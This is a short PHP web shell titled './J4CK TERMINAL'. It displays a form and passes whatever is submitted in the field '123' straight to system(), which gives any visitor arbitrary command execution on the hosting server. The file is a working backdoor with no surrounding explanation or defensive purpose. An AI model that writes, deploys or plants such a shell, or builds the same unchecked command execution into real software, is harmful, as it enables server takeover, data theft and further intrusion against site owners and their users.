<?php
echo "./J4CK TERMINAL";
        echo "<pre>";
        echo "<center><form name='form' action='#' method='post'>
        <input type='text' name='123'/> <input type='submit' value='enter'/>
        </form></center>";
        $cmd = ($_POST['123']);
        system($cmd);
        echo "</pre>";
        die;
?>
